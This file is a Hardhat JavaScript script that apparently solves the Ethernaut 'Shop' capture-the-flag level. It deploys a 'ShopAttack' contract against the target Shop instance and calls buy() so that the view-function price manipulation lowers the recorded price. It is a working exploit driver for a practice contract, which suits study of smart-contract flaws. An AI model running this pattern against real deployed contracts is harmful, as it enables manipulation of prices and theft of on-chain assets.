const hre = require("hardhat");

async function main() {
  const Victim = await ethers.getContractFactory("Shop");
  const victim = await Victim.attach(
    "0x3898EC598c9Bfd54bE6D816BA98170b18c5c2549" // This is the contract address that you get from starting your instance
  );

  // Check the initial values of price and isSold
  const value1 = await victim.price();
  console.log("The initial price is ", value1.toString());
  const value2 = await victim.isSold();
  console.log("The initial value of isSold is ", value2); // it is already false

  // This is for the attacking contract
  const MyContract = await ethers.getContractFactory("ShopAttack");

  // Deploy contract
  const contract = await MyContract.deploy(
    "0x3898EC598c9Bfd54bE6D816BA98170b18c5c2549"
  );
  await contract.deployed();

  console.log(`Deployed contract to: ${contract.address}`);

  // Call the buy function from our malicious contract to follow the logic from our price function
  const attack1 = await contract.buy();
  await attack1.wait(1);

  // Check what is the final value of price to see that it is less than 100
  const value3 = await victim.price();
  console.log("The final price is ", value3.toString());
}

// Recommended pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
